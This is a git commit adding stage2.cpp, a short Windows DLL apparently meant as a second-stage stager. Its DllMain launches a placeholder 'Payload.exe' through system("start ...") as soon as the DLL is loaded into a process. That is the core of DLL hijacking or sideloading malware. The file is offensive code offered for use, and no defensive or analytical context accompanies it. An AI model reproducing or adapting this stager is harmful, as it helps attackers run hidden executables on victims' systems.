36470bf204f94293200e490bb4dea5f35ca9c2a9
Harsh8266 <58392509+harsh8266@users.noreply.github.com>
2023-08-09 15:48:12 +0530

    Create stage2.cpp

---
+++ stage2.cpp
@@ -0,0 +1,16 @@
+#define WIN32_LEAN_AND_MEAN
+#include <windows.h>
+#include <cstdlib>
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    switch (ul_reason_for_call) {
+        case DLL_PROCESS_ATTACH:
+            system("start C:\\Path\\To\\Your\\Payload.exe");
+            break;
+        case DLL_THREAD_ATTACH:
+        case DLL_THREAD_DETACH:
+        case DLL_PROCESS_DETACH:
+            break;
+    }
+    return TRUE;
+}
